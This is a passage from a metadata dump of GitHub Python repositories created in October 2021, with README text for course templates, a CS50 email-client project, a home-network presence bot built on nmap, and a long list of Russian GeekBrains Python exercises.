417612402;boto3-ec2-s3-project;https://github.com/bryankeane0/boto3-ec2-s3-project;Python;2021-10-15T19:25:44Z;1;1;0;boto3-ec2-s3-script 
417659184;hello;https://github.com/AlaaNeamatallaJR/hello;;2021-10-15T23:02:13Z;0;0;0;
417646389;grr;https://github.com/kecho/grr;Python;2021-10-15T21:53:50Z;0;0;0;GRR by Kleber Garcia GRR stands for Gpu Rasterizer and Renderer. It is a python based GPU software rasterizer and renderer, purely built on compute using coalpy as a hardware abstraction layer. Still work in progress. 
417628741;feature_engineering;https://github.com/leobioinf0/feature_engineering;;2021-10-15T20:38:47Z;0;0;0;feature_engineering Aprèn a gestionar paràmetres amb Python. 
417633706;DBMS_Benchmarks;https://github.com/LordPozdnyakov/DBMS_Benchmarks;Python;2021-10-15T20:57:18Z;0;0;0;
417621346;plugin.video.kolibka;https://github.com/npghub/plugin.video.kolibka;Python;2021-10-15T20:04:39Z;0;0;0;plugin.video.kolibka 
417665294;dataStructuresAndAlgos;https://github.com/EvanErickson/dataStructuresAndAlgos;Python;2021-10-15T23:38:20Z;0;0;0;
417576223;Hangman_2;https://github.com/Airdrie86/Hangman_2;HTML;2021-10-15T17:03:01Z;0;0;0; Welcome USER_NAME, This is the Code Institute student template for deploying your third portfolio project, the Python command-line project. The last update to this file was: August 17, 2021 Reminders  Your code must be placed in the run.py file Your dependencies must be placed in the requirements.txt file Do not edit any of the other files or your code may not deploy properly  Creating the Heroku app When you create the app, you will need to add two buildpacks from the Settings tab. The ordering is as follows:  heroku/python heroku/nodejs  You must then create a Config Var called PORT. Set this to 8000 If you have credentials, such as in the Love Sandwiches project, you must create another Config Var called CREDS and paste the JSON into the value field. Connect your GitHub repository and deploy as normal. Constraints The deployment terminal is set to 80 columns by 24 rows. That means that each line of text needs to be 80 characters or less otherwise it will be wrapped onto a second line.  Happy coding! 
417641786;salvage_npy;https://github.com/Claybarn/salvage_npy;Python;2021-10-15T21:30:11Z;0;0;0;
417644501;CFB_Analytics;https://github.com/qmaclean/CFB_Analytics;;2021-10-15T21:44:00Z;0;0;0;CFB_Analytics Python Notebook of College football comparison 
417624365;rosa;https://github.com/Rosebeke1/rosa;;2021-10-15T20:18:41Z;0;0;0;
417661456;hello;https://github.com/MannyyB/hello;;2021-10-15T23:16:41Z;0;0;0;
417586391;terminal-connect-four;https://github.com/fshfngr/terminal-connect-four;Python;2021-10-15T17:42:02Z;0;0;0;
417596540;hello-world;https://github.com/MLUNA25/hello-world;;2021-10-15T18:21:17Z;0;0;0;hello-world My first repository to learn Python Hello guys, this is my first testing with that stuff haha 
417572337;2021-10-26-usgs-online;https://github.com/jjyh/2021-10-26-usgs-online;HTML;2021-10-15T16:49:25Z;0;0;1;" The Carpentries Workshop Template This repository is The Carpentries' (Software Carpentry, Data Carpentry, and Library Carpentry's) template for creating websites for workshops.   Please do not fork this repository directly on GitHub. Instead, please use GitHub's ""template"" function following the instructions below to copy this workshop-template repository and customize it for your workshop.   Please do your work in your repository's gh-pages branch, since that is what is automatically published as a website by GitHub.   Once you are done, please also let us know the workshop URL. If this is a self-organised workshop, you should also fill in the self-organized workshop form (if you have not already done so), so we can keep track of all workshops. We build the list of workshops on our websites from the data included in your index.md page. We can only do that if you customize that page correctly and let us know the workshop URL.   If you run into problems, or have ideas about how to make this process simpler, please get in touch. The pages on customizing your website, the FAQ, and the design notes have more detail on what we do and why. And please note: if you are teaching Git, please create a separate repository for your learners to practice in. Video Tutorial There is a YouTube video that demonstrates how to create a workshop website. Creating a Repository   Log in to GitHub. (If you do not have an account, you can quickly create one for free.) You must be logged in for the remaining steps to work.   On this page (https://github.com/carpentries/workshop-template), click on the green ""Use this template"" button (top right)    Select the owner for your new repository. (This will probably be you, but may instead be an organization you belong to.)   Choose a name for your workshop website repository. This name should have the form YYYY-MM-DD-site, e.g., 2016-12-01-oomza, where YYYY-MM-DD is the start date of the workshop. If your workshop is held online, then the respository name should have -online in the end. e.g., 2016-12-01-oomza-online   Make sure the repository is public, leave ""Include all branches"" unchecked, and click on ""Create repository from template"". You will be redirected to your new copy of the workshop template respository.   Your new website will be rendered at https://your_username.github.io/YYYY-MM-DD-site. For example, if your username is gvwilson, the website's URL will be https://gvwilson.github.io/2016-12-01-oomza.   If you experience a problem, please get in touch. Customizing Your Website (Required Steps) There are two ways of customizing your website. You can either:  edit the files directly in GitHub using your web browser clone the repository on your computer and update the files locally  Updating the files on GitHub in your web browser   Go into your newly-created repository, which will be at https://github.com/your_username/YYYY-MM-DD-site. For example, if your username is gvwilson, the repository's URL will be https://github.com/gvwilson/2016-12-01-oomza.   Ensure you are on the gh-pages branch by clicking on the branch under the drop down in the menu bar (see the note below):    Edit the header of index.md to customize the list of instructors, workshop venue, etc. You can do this in the browser by clicking on it in the file view on GitHub and then selecting the pencil icon in the menu bar:  Editing hints are embedded in index.md, and full instructions are in the customization instructions.   Remove the notice about using the workshop template in the index.md file. You can safely delete everything between the {% comment %} and {% endcomment %} (included) as indicated below (about from line 35 to line 51): {% comment %} <------------ remove from this line 8< ============= For a workshop delete from here ============= For a workshop please delete the following block until the next dashed-line {% endcomment %}  <div class=""alert alert-danger"">   .... </div>  {% comment %}  8< ============================= until here ================== {% endcomment %} <--------- until this line    Edit _config.yml to customize certain site-wide variables, such as: carpentry (to tell your participants the lesson program for your workshop), curriculum and flavor for the curriculum  taught in your workshop, and title (overall title for all pages). Editing hints are embedded in _config.yml, and full instructions are in the customization instructions.   Edit the schedule.html file to edit the schedule for your upcoming workshop. This file is located in the _includes directory, make sure to choose the one from the appropriate dc (Data Carpentry workshop), lc (Library Carpentry), or swc (Software Carpentry) subdirectory.   Working locally  Note: you don't have to do this, if you have already updated your site using the web interface.  If you are already familiar with Git, you can clone the repository to your desktop, edit index.md, _config.yml, and schedule.html following the instruction above there, and push your changes back to the repository. git clone https://github.com/your_username/YYYY-MM-DD-site In order to view your changes once you are done editing, if you have bundler installed (see the installation instructions below), you can preview your site locally with: make serve and go to http://0.0.0.0:4000 to preview your site. Before pushing your changes to your repository, we recommend that you also check for any potential issues with your site by running: make workshop-check Once you are satisfied with the edits to your site, commit and push the changes to your repository. A few minutes later, you can go to the GitHub Pages URL for your workshop site and preview it. In the example above, this is https://gvwilson.github.io/2016-12-01-oomza. The finished page should look something like this. Optional but Recommended Steps Update your repository description and link your website At the top of your repository on GitHub you'll see No description, website, or topics provided. — Edit  Click 'Edit' and add:   A very brief description of your workshop in the ""Description"" box (e.g., ""Oomza University workshop, Dec. 2016"")   The URL for your workshop in the ""Website"" box (e.g., https://gvwilson.github.io/2016-12-01-oomza)   This will help people find your website if they come to your repository's home page. Update the content of the README file You can change the README.md file in your website's repository, which contains these instructions, so that it contains a short description of your workshop and a link to the workshop website. Additional Notes Note: please do all of your work in your repository's gh-pages branch, since GitHub automatically publishes that as a website. Note: this template includes some files and directories that most workshops do not need, but which provide a standard place to put extra content if desired. See the design notes for more information about these. Further instructions are available in the customization instructions. This FAQ includes a few extra tips (additions are always welcome) and these notes on the background and design of this template may help as well. Creating Extra Pages In rare cases, you may want to add extra pages to your workshop website. You can do this by putting either Markdown or HTML pages in the website's root directory and styling them according to the instructions give in the lesson template. Installing Software If you want to set up Jekyll so that you can preview changes on your own machine before pushing them to GitHub, you must install the software described in the lesson example setup instructions. Setting Up a Separate Repository for Learners If you are teaching Git, you should create a separate repository for learners to use in that lesson. You should not have them use the workshop website repository because:   your workshop website repository contains many files that most learners don't need to see during the lesson, and   you probably don't want to accidentally merge a damaging pull request from a novice Git user into your workshop's website while you are using it to teach.   You can call this repository whatever you like, and add whatever content you need to it. Getting and Giving Help We are committed to offering a pleasant setup experience for our learners and organizers. If you find bugs in our instructions, or would like to suggest improvements, please file an issue or mail us. "
417622712;analise_dados;https://github.com/Alicemarpe/analise_dados;;2021-10-15T20:11:00Z;0;0;0;analise_dados Análise de Dados com Python e Pandas 
417624267;LldbSosExts;https://github.com/dmetzgar/LldbSosExts;Python;2021-10-15T20:18:11Z;0;0;0;LLDB SOS Extensions LLDB python scripts to extend SOS commands for .NET debugging on Linux Importing the commands In LLDB, execute: command script import <path to>/LldbSosExts.py  Commands  allclrstacks - Prints CLR stacks for all the threads in the process rsc - Runs an SOS command and writes its output to a file (tempsos.txt) gfs - Gets the first instance of a type from the top of the thread stack dko - Dumps the simplified contents of a known .NET object etec - Expands thread execution context of first thread on the stack eoh - Executes a command on every object address given a method table address  
417594381;Decision-tree-Knn-Random-forest-Nave-Bayes-SVM-Logistic-regression-gradeint-Boosting-in-python;https://github.com/Jaiswar1232/Decision-tree-Knn-Random-forest-Nave-Bayes-SVM-Logistic-regression-gradeint-Boosting-in-python;Jupyter Notebook;2021-10-15T18:12:45Z;0;0;0;
417566698;py_xl_tools;https://github.com/weighne/py_xl_tools;Python;2021-10-15T16:28:24Z;0;0;0;py_xl_tools A bunch of python functions for working with spreadsheets. Will be expanded over time fo' sho 
417565108;ml_cloud_deploy_stuff;https://github.com/maxwellmadewell/ml_cloud_deploy_stuff;Python;2021-10-15T16:22:34Z;0;0;0;ml_cloud_deploy_stuff Modules to assist in python/docker deployment to cloud infrastructures 
417650087;GameOfWines;https://github.com/TLeeMoo/GameOfWines;Jupyter Notebook;2021-10-15T22:10:26Z;0;0;0;GameOfWines Using python to conduct simple analysis on different wines. 
417610466;Pet-Simulator;https://github.com/Colosimorichard/Pet-Simulator;Python;2021-10-15T19:17:19Z;0;0;0;
417586571;argparse-to-json;https://github.com/childsish/argparse-to-json;Python;2021-10-15T17:42:47Z;0;0;0;argparse-to-json Convert Python argparse parsers to json compatible with JSON Form. 
417572496;careerfoundrypython;https://github.com/CAAnthony21/careerfoundrypython;;2021-10-15T16:49:59Z;0;0;0;
417595754;storege-api;https://github.com/ibryans/storege-api;;2021-10-15T18:18:06Z;0;0;0;storege-api The backend for StoreGE application. Made with python & Django 
417608584;CS50_mail;https://github.com/Okeoma/CS50_mail;Python;2021-10-15T19:09:26Z;0;0;0;"CS50w Project-3 Mail This is the project 3 of the course CS50w (CS50's Website Programming with Python and JavaScript) in which I designed a front-end for an email client that makes API calls to send and receive emails. Specification Using JavaScript, HTML, and CSS, complete the implementation of your single-page-app email client. You must fulfill the following requirements:   Send Mail: When a user submits the email composition form, add JavaScript code to actually send the email.  You’ll likely want to make a POST request to /emails, passing in values for recipients, subject, and body. Once the email has been sent, load the user’s sent mailbox.    Mailbox: When a user visits their Inbox, Sent mailbox, or Archive, load the appropriate mailbox.  You’ll likely want to make a GET request to /emails/ to request the emails for a particular mailbox. When a mailbox is visited, the application should first query the API for the latest emails in that mailbox. When a mailbox is visited, the name of the mailbox should appear at the top of the page (this part is done for you). Each email should then be rendered in its own box (e.g. as a  with a border) that displays who the email is from, what the subject line is, and the      timestamp of the email. If the email is unread, it should appear with a white background. If the email has been read, it should appear with a gray background.    View Email: When a user clicks on an email, the user should be taken to a view where they see the content of that email.  You’ll likely want to make a GET request to /emails/<email_id> to request the email. Your application should show the email’s sender, recipients, subject, timestamp, and body. You’ll likely want to add an additional div to inbox.html (in addition to emails-view and compose-view) for displaying the email. Be sure to update your code to hide and show the right views when navigation options are clicked. See the hint in the Hints section about how to add an event listener to an HTML element that you’ve added to the DOM. Once the email has been clicked on, you should mark the email as read. Recall that you can send a PUT request to /emails/<email_id> to update whether an email is read or not.    Archive and Unarchive: Allow users to archive and unarchive emails that they have received.  When viewing an Inbox email, the user should be presented with a button that lets them archive the email. When viewing an Archive email, the user should be presented with a button that lets them unarchive the email. This requirement does not apply to emails in the Sent mailbox. Recall that you can send a PUT request to /emails/<email_id> to mark an email as archived or unarchived. Once an email has been archived or unarchived, load the user’s inbox.    Reply: Allow users to reply to an email.  When viewing an email, the user should be presented with a “Reply” button that lets them reply to the email. When the user clicks the “Reply” button, they should be taken to the email composition form. Pre-fill the composition form with the recipient field set to whoever sent the original email. Pre-fill the subject line. If the original email had a subject line of foo, the new subject line should be Re: foo. (If the subject line already begins with Re: , no need to add it again.) Pre-fill the body of the email with a line like ""On Jan 1 2020, 12:00 AM foo@example.com wrote:"" followed by the original text of the email.      💻   View Course here ▶️   View Live Demo here   "
417611244;WhosHome;https://github.com/alloncm/WhosHome;Python;2021-10-15T19:20:54Z;0;0;0;"WhosHome? WhosHome is a telegram bot you can run on your local home network in order to get an answer to the question ""Who's Home?"" whenever you want. The bot does this by using nmap and parsing its output. Disclaimer I didn't find a python library that wrap nmap and will allow me complete control on the nmap command so I just parsed nmap output (I know its ugly and if someone has another option I will be happy to hear :)). This script currently works only on linux and the user running it should have sudo preveliges. How to spy on my family too? The script has a config.py file, please edit it and add the neccessary details there. The script require a bit of investigation activity in order to fill the mapping table between mac address and home member. installation The script needs to run on a unix machine connected to the home network. Steps:   Install nmap - sudo apt-get install nmap   Register a bot at telegram using the BotFather   Clone the repo   Fill the missing details in the config.py file  Enter the telegram bot token received when creating your bot. The host password (you can read the code it will use it to run nmap with sudo). Ip range to scan, example 1.1.1.0-255 will scan for all the ip addresses from 1.1.1.0 to 1.1.1.255. The mapping between a mac address and a member name. List of allowed ids - every telegram message will have the user id with it, you can receive it by sending a message to the Telegram Raw Bot.    Install deps - pip install -r requirements.txt   Optinal: tell the family about the bot and register them as valid members :)   Another disclaimer This one of my first python programs so Ill gladly take any advices and pull requests! "
417576033;Guess_The_Word;https://github.com/Airdrie86/Guess_The_Word;HTML;2021-10-15T17:02:19Z;0;0;0; Welcome USER_NAME, This is the Code Institute student template for deploying your third portfolio project, the Python command-line project. The last update to this file was: August 17, 2021 Reminders  Your code must be placed in the run.py file Your dependencies must be placed in the requirements.txt file Do not edit any of the other files or your code may not deploy properly  Creating the Heroku app When you create the app, you will need to add two buildpacks from the Settings tab. The ordering is as follows:  heroku/python heroku/nodejs  You must then create a Config Var called PORT. Set this to 8000 If you have credentials, such as in the Love Sandwiches project, you must create another Config Var called CREDS and paste the JSON into the value field. Connect your GitHub repository and deploy as normal. Constraints The deployment terminal is set to 80 columns by 24 rows. That means that each line of text needs to be 80 characters or less otherwise it will be wrapped onto a second line.  Happy coding! 
417649591;Tasks-from-GeekBrains;https://github.com/p1pk4/Tasks-from-GeekBrains;;2021-10-15T22:08:13Z;0;0;0;"Tasks-from-GeekBrains Задачи с платного курса GeekBrains. ""Основы языка Python"".  Урок 1. Знакомство с Python   Поработайте с переменными, создайте несколько, выведите на экран, запросите у пользователя несколько чисел и строк и сохраните в переменные, выведите на экран.   Пользователь вводит время в секундах. Переведите время в часы, минуты и секунды и выведите в формате чч:мм:сс. Используйте форматирование строк.   Узнайте у пользователя число n. Найдите сумму чисел n + nn + nnn. Например, пользователь ввёл число 3. Считаем 3 + 33 + 333 = 369.   Пользователь вводит целое положительное число. Найдите самую большую цифру в числе. Для решения используйте цикл while и арифметические операции.   Запросите у пользователя значения выручки и издержек фирмы. Определите, с каким финансовым результатом работает фирма (прибыль — выручка больше издержек, или убыток — издержки больше выручки). Выведите соответствующее сообщение. Если фирма отработала с прибылью, вычислите рентабельность выручки (соотношение прибыли к выручке). Далее запросите численность сотрудников фирмы и определите прибыль фирмы в расчете на одного сотрудника.   Спортсмен занимается ежедневными пробежками. В первый день его результат составил a километров. Каждый день спортсмен увеличивал результат на 10 % относительно предыдущего. Требуется определить номер дня, на который общий результат спортсмена составить не менее b километров. Программа должна принимать значения параметров a и b и выводить одно натуральное число — номер дня. Например: a = 2, b = 3. Результат: 1-й день: 2 2-й день: 2,2 3-й день: 2,42 4-й день: 2,66 5-й день: 2,93 6-й день: 3,22 Ответ: на 6-й день спортсмен достиг результата — не менее 3 км.    Урок 2. Встроенные типы и операции с ними   Создать список и заполнить его элементами различных типов данных. Реализовать скрипт проверки типа данных каждого элемента. Использовать функцию type() для проверки типа. Элементы списка можно не запрашивать у пользователя, а указать явно, в программе.   Для списка реализовать обмен значений соседних элементов, т.е. Значениями обмениваются элементы с индексами 0 и 1, 2 и 3 и т.д. При нечетном количестве элементов последний сохранить на своем месте. Для заполнения списка элементов необходимо использовать функцию input().   Пользователь вводит месяц в виде целого числа от 1 до 12. Сообщить к какому времени года относится месяц (зима, весна, лето, осень). Напишите решения через list и через dict.   Пользователь вводит строку из нескольких слов, разделённых пробелами. Вывести каждое слово с новой строки. Строки необходимо пронумеровать. Если в слово длинное, выводить только первые 10 букв в слове.   Реализовать структуру «Рейтинг», представляющую собой не возрастающий набор натуральных чисел. У пользователя необходимо запрашивать новый элемент рейтинга. Если в рейтинге существуют элементы с одинаковыми значениями, то новый элемент с тем же значением должен разместиться после них. Подсказка. Например, набор натуральных чисел: 7, 5, 3, 3, 2. Пользователь ввел число 3. Результат: 7, 5, 3, 3, 3, 2. Пользователь ввел число 8. Результат: 8, 7, 5, 3, 3, 2. Пользователь ввел число 1. Результат: 7, 5, 3, 3, 2, 1. Набор натуральных чисел можно задать непосредственно в коде, например, my_list = [7, 5, 3, 3, 2].    Реализовать структуру данных «Товары». Она должна представлять собой список кортежей. Каждый кортеж хранит информацию об отдельном товаре. В кортеже должно быть два элемента — номер товара и словарь с параметрами (характеристиками товара: название, цена, количество, единица измерения). Структуру нужно сформировать программно, т.е. запрашивать все данные у пользователя. Пример готовой структуры: [ (1, {“название”: “компьютер”, “цена”: 20000, “количество”: 5, “eд”: “шт.”}), (2, {“название”: “принтер”, “цена”: 6000, “количество”: 2, “eд”: “шт.”}), (3, {“название”: “сканер”, “цена”: 2000, “количество”: 7, “eд”: “шт.”}) ] Необходимо собрать аналитику о товарах. Реализовать словарь, в котором каждый ключ — характеристика товара, например название, а значение — список значений-характеристик, например список названий товаров. Пример: { “название”: [“компьютер”, “принтер”, “сканер”], “цена”: [20000, 6000, 2000], “количество”: [5, 2, 7], “ед”: [“шт.”] }     Урок 3. Функции   Реализовать функцию, принимающую два числа (позиционные аргументы) и выполняющую их деление. Числа запрашивать у пользователя, предусмотреть обработку ситуации деления на ноль.   Реализовать функцию, принимающую несколько параметров, описывающих данные пользователя: имя, фамилия, год рождения, город проживания, email, телефон. Функция должна принимать параметры как именованные аргументы. Реализовать вывод данных о пользователе одной строкой.   Реализовать функцию my_func(), которая принимает три позиционных аргумента, и возвращает сумму наибольших двух аргументов.   Программа принимает действительное положительное число x и целое отрицательное число y. Необходимо выполнить возведение числа x в степень y. Задание необходимо реализовать в виде функции my_func(x, y). При решении задания необходимо обойтись без встроенной функции возведения числа в степень. Подсказка: попробуйте решить задачу двумя способами. Первый — возведение в степень с помощью оператора **. Второй — более сложная реализация без оператора **, предусматривающая использование цикла.   Программа запрашивает у пользователя строку чисел, разделенных пробелом. При нажатии Enter должна выводиться сумма чисел. Пользователь может продолжить ввод чисел, разделенных пробелом и снова нажать Enter. Сумма вновь введенных чисел будет добавляться к уже подсчитанной сумме. Но если вместо числа вводится специальный символ, выполнение программы завершается. Если специальный символ введен после нескольких чисел, то вначале нужно добавить сумму этих чисел к полученной ранее сумме и после этого завершить программу.   Реализовать функцию int_func(), принимающую слово из маленьких латинских букв и возвращающую его же, но с прописной первой буквой. Например, print(int_func(‘text’)) -> Text. Продолжить работу над заданием. В программу должна попадать строка из слов, разделенных пробелом. Каждое слово состоит из латинских букв в нижнем регистре. Сделать вывод исходной строки, но каждое слово должно начинаться с заглавной буквы. Необходимо использовать написанную ранее функцию int_func().    Урок 4. Полезные инструменты   Реализовать скрипт, в котором должна быть предусмотрена функция расчета заработной платы сотрудника. В расчете необходимо использовать формулу: (выработка в часах * ставка в час) + премия. Для выполнения расчета для конкретных значений необходимо запускать скрипт с параметрами.   Представлен список чисел. Необходимо вывести элементы исходного списка, значения которых больше предыдущего элемента. Подсказка: элементы, удовлетворяющие условию, оформить в виде списка. Для формирования списка использовать генератор. Пример исходного списка: [300, 2, 12, 44, 1, 1, 4, 10, 7, 1, 78, 123, 55]. Результат: [12, 44, 4, 10, 78, 123].   Для чисел в пределах от 20 до 240 найти числа, кратные 20 или 21. Необходимо решить задание в одну строку. Подсказка: использовать функцию range() и генератор.   Представлен список чисел. Определить элементы списка, не имеющие повторений. Сформировать итоговый массив чисел, соответствующих требованию. Элементы вывести в порядке их следования в исходном списке. Для выполнения задания обязательно использовать генератор. Пример исходного списка: [2, 2, 2, 7, 23, 1, 44, 44, 3, 2, 10, 7, 4, 11]. Результат: [23, 1, 3, 10, 4, 11]   Реализовать формирование списка, используя функцию range() и возможности генератора. В список должны войти четные числа от 100 до 1000 (включая границы). Необходимо получить результат вычисления произведения всех элементов списка. Подсказка: использовать функцию reduce().   Реализовать два небольших скрипта: а) итератор, генерирующий целые числа, начиная с указанного, б) итератор, повторяющий элементы некоторого списка, определенного заранее. Подсказка: использовать функцию count() и cycle() модуля itertools. Обратите внимание, что создаваемый цикл не должен быть бесконечным. Необходимо предусмотреть условие его завершения. Например, в первом задании выводим целые числа, начиная с 3, а при достижении числа 10 завершаем цикл. Во втором также необходимо предусмотреть условие, при котором повторение элементов списка будет прекращено.   Реализовать генератор с помощью функции с ключевым словом yield, создающим очередное значение. При вызове функции должен создаваться объект-генератор. Функция должна вызываться следующим образом: for el in fact(n). Функция отвечает за получение факториала числа, а в цикле необходимо выводить только первые n чисел, начиная с 1! и до n!. Подсказка: факториал числа n — произведение чисел от 1 до n. Например, факториал четырёх 4! = 1 * 2 * 3 * 4 = 24.    Урок 5. Работа с файлами   Создать программно файл в текстовом формате, записать в него построчно данные, вводимые пользователем. Об окончании ввода данных свидетельствует пустая строка.   Создать текстовый файл (не программно), сохранить в нем несколько строк, выполнить подсчет количества строк, количества слов в каждой строке.   Создать текстовый файл (не программно), построчно записать фамилии сотрудников и величину их окладов. Определить, кто из сотрудников имеет оклад менее 20 тыс., вывести фамилии этих сотрудников. Выполнить подсчет средней величины дохода сотрудников.   Создать (не программно) текстовый файл со следующим содержимым: One — 1 Two — 2 Three — 3 Four — 4 Необходимо написать программу, открывающую файл на чтение и считывающую построчно данные. При этом английские числительные должны заменяться на русские. Новый блок строк должен записываться в новый текстовый файл.   Создать (программно) текстовый файл, записать в него программно набор чисел, разделенных пробелами. Программа должна подсчитывать сумму чисел в файле и выводить ее на экран.   Необходимо создать (не программно) текстовый файл, где каждая строка описывает учебный предмет и наличие лекционных, практических и лабораторных занятий по этому предмету и их количество. Важно, чтобы для каждого предмета не обязательно были все типы занятий. Сформировать словарь, содержащий название предмета и общее количество занятий по нему. Вывести словарь на экран. Примеры строк файла: Информатика: 100(л) 50(пр) 20(лаб). Физика: 30(л) — 10(лаб) Физкультура: — 30(пр) — Пример словаря: {“Информатика”: 170, “Физика”: 40, “Физкультура”: 30}   Создать (не программно) текстовый файл, в котором каждая строка должна содержать данные о фирме: название, форма собственности, выручка, издержки. Пример строки файла: firm_1 ООО 10000 5000. Необходимо построчно прочитать файл, вычислить прибыль каждой компании, а также среднюю прибыль. Если фирма получила убытки, в расчет средней прибыли ее не включать. Далее реализовать список. Он должен содержать словарь с фирмами и их прибылями, а также словарь со средней прибылью. Если фирма получила убытки, также добавить ее в словарь (со значением убытков). Пример списка: [{“firm_1”: 5000, “firm_2”: 3000, “firm_3”: 1000}, {“average_profit”: 2000}]. Итоговый список сохранить в виде json-объекта в соответствующий файл. Пример json-объекта: [{""firm_1"": 5000, ""firm_2"": 3000, ""firm_3"": 1000}, {""average_profit"": 2000}] Подсказка: использовать менеджеры контекста.    Урок 6. Объектно-ориентированное программирование   Создать класс TrafficLight (светофор) и определить у него один атрибут color (цвет) и метод running (запуск). Атрибут реализовать как приватный. В рамках метода реализовать переключение светофора в режимы: красный, желтый, зеленый. Продолжительность первого состояния (красный) составляет 7 секунд, второго (желтый) — 2 секунды, третьего (зеленый) — на ваше усмотрение. Переключение между режимами должно осуществляться только в указанном порядке (красный, желтый, зеленый). Проверить работу примера, создав экземпляр и вызвав описанный метод. Задачу можно усложнить, реализовав проверку порядка режимов, и при его нарушении выводить соответствующее сообщение и завершать скрипт.   Реализовать класс Road (дорога), в котором определить атрибуты: length (длина), width (ширина). Значения данных атрибутов должны передаваться при создании экземпляра класса. Атрибуты сделать защищенными. Определить метод расчета массы асфальта, необходимого для покрытия всего дорожного полотна. Использовать формулу: длина * ширина * масса асфальта для покрытия одного кв метра дороги асфальтом, толщиной в 1 см * чи сло см толщины полотна. Проверить работу метода. Например: 20м * 5000м * 25кг * 5см = 12500 т   Реализовать базовый класс Worker (работник), в котором определить атрибуты: name, surname, position (должность), income (доход). Последний атрибут должен быть защищенным и ссылаться на словарь, содержащий элементы: оклад и премия, например, {""wage"": wage, ""bonus"": bonus}. Создать класс Position (должность) на базе класса Worker. В классе Position реализовать методы получения полного имени сотрудника (get_full_name) и дохода с учетом премии (get_total_income). Проверить работу примера на реальных данных (создать экземпляры класса Position, передать данные, проверить значения атрибутов, вызвать методы экземпляров).   Реализуйте базовый класс Car. У данного класса должны быть следующие атрибуты: speed, color, name, is_police (булево). А также методы: go, stop, turn(direction), которые должны сообщать, что машина поехала, остановилась, повернула (куда). Опишите несколько дочерних классов: TownCar, SportCar, WorkCar, PoliceCar. Добавьте в базовый класс метод show_speed, который должен показывать текущую скорость автомобиля. Для классов TownCar и WorkCar переопределите метод show_speed. При значении скорости свыше 60 (TownCar) и 40 (WorkCar) должно выводиться сообщение о превышении скорости. Создайте экземпляры классов, передайте значения атрибутов. Выполните доступ к атрибутам, выведите результат. Выполните вызов методов и также покажите результат.   Реализовать класс Stationery (канцелярская принадлежность). Определить в нем атрибут title (название) и метод draw (отрисовка). Метод выводит сообщение “Запуск отрисовки.” Создать три дочерних класса Pen (ручка), Pencil (карандаш), Handle (маркер). В каждом из классов реализовать переопределение метода draw. Для каждого из классов методы должен выводить уникальное сообщение. Создать экземпляры классов и проверить, что выведет описанный метод для каждого экземпляра.    Урок 7. ООП. Продвинутый уровень   Реализовать класс Matrix (матрица). Обеспечить перегрузку конструктора класса (метод init()), который должен принимать данные (список списков) для формирования матрицы. Подсказка: матрица — система некоторых математических величин, расположенных в виде прямоугольной схемы. Примеры матриц вы найдете в методичке. Следующий шаг — реализовать перегрузку метода str() для вывода матрицы в привычном виде. Далее реализовать перегрузку метода add() для реализации операции сложения двух объектов класса Matrix (двух матриц). Результатом сложения должна быть новая матрица. Подсказка: сложение элементов матриц выполнять поэлементно — первый элемент первой строки первой матрицы складываем с первым элементом первой строки второй матрицы и т.д.   Реализовать проект расчета суммарного расхода ткани на производство одежды. Основная сущность (класс) этого проекта — одежда, которая может иметь определенное название. К типам одежды в этом проекте относятся пальто и костюм. У этих типов одежды существуют параметры: размер (для пальто) и рост (для костюма). Это могут быть обычные числа: V и H, соответственно. Для определения расхода ткани по каждому типу одежды использовать формулы: для пальто (V/6.5 + 0.5), для костюма (2 * H + 0.3). Проверить работу этих методов на реальных данных. Реализовать общий подсчет расхода ткани. Проверить на практике полученные на этом уроке знания: реализовать абстрактные классы для основных классов проекта, проверить на практике работу декоратора @property.   Реализовать программу работы с органическими клетками. Необходимо создать класс Клетка. В его конструкторе инициализировать параметр, соответствующий количеству клеток (целое число). В классе должны быть реализованы методы перегрузки арифметических операторов: сложение (add()), вычитание (sub()), умножение (mul()), деление (truediv()).Данные методы должны применяться только к клеткам и выполнять увеличение, уменьшение, умножение и обычное (не целочисленное) деление клеток, соответственно. В методе деления должно осуществляться округление значения до целого числа. Сложение. Объединение двух клеток. При этом число ячеек общей клетки должно равняться сумме ячеек исходных двух клеток. Вычитание. Участвуют две клетки. Операцию необходимо выполнять только если разность количества ячеек двух клеток больше нуля, иначе выводить соответствующее сообщение. Умножение. Создается общая клетка из двух. Число ячеек общей клетки определяется как произведение количества ячеек этих двух клеток. Деление. Создается общая клетка из двух. Число ячеек общей клетки определяется как целочисленное деление количества ячеек этих двух клеток. В классе необходимо реализовать метод make_order(), принимающий экземпляр класса и количество ячеек в ряду. Данный метод позволяет организовать ячейки по рядам. Метод должен возвращать строку вида \n\n*****..., где количество ячеек между \n равно переданному аргументу. Если ячеек на формирование ряда не хватает, то в последний ряд записываются все оставшиеся. Например, количество ячеек клетки равняется 12, количество ячеек в ряду — 5. Тогда метод make_order() вернет строку: \n\n**. Или, количество ячеек клетки равняется 15, количество ячеек в ряду — 5. Тогда метод make_order() вернет строку: \n\n*****.    Урок 8. ООП. Полезные дополнения   Реализовать класс «Дата», функция-конструктор которого должна принимать дату в виде строки формата «день-месяц-год». В рамках класса реализовать два метода. Первый, с декоратором @classmethod, должен извлекать число, месяц, год и преобразовывать их тип к типу «Число». Второй, с декоратором @staticmethod, должен проводить валидацию числа, месяца и года (например, месяц — от 1 до 12). Проверить работу полученной структуры на реальных данных.   Создайте собственный класс-исключение, обрабатывающий ситуацию деления на нуль. Проверьте его работу на данных, вводимых пользователем. При вводе пользователем нуля в качестве делителя программа должна корректно обработать эту ситуацию и не завершиться с ошибкой.   Создайте собственный класс-исключение, который должен проверять содержимое списка на наличие только чисел. Проверить работу исключения на реальном примере. Необходимо запрашивать у пользователя данные и заполнять список. Класс-исключение должен контролировать типы данных элементов списка. Примечание: длина списка не фиксирована. Элементы запрашиваются бесконечно, пока пользователь сам не остановит работу скрипта, введя, например, команду “stop”. При этом скрипт завершается, сформированный список выводится на экран. Подсказка: для данного задания примем, что пользователь может вводить только числа и строки. При вводе пользователем очередного элемента необходимо реализовать проверку типа элемента и вносить его в список, только если введено число. Класс-исключение должен не позволить пользователю ввести текст (не число) и отобразить соответствующее сообщение. При этом работа скрипта не должна завершаться.   Начните работу над проектом «Склад оргтехники». Создайте класс, описывающий склад. А также класс «Оргтехника», который будет базовым для классов-наследников. Эти классы — конкретные типы оргтехники (принтер, сканер, ксерокс). В базовом классе определить параметры, общие для приведенных типов. В классах-наследниках реализовать параметры, уникальные для каждого типа оргтехники.   Продолжить работу над первым заданием. Разработать методы, отвечающие за приём оргтехники на склад и передачу в определенное подразделение компании. Для хранения данных о наименовании и количестве единиц оргтехники, 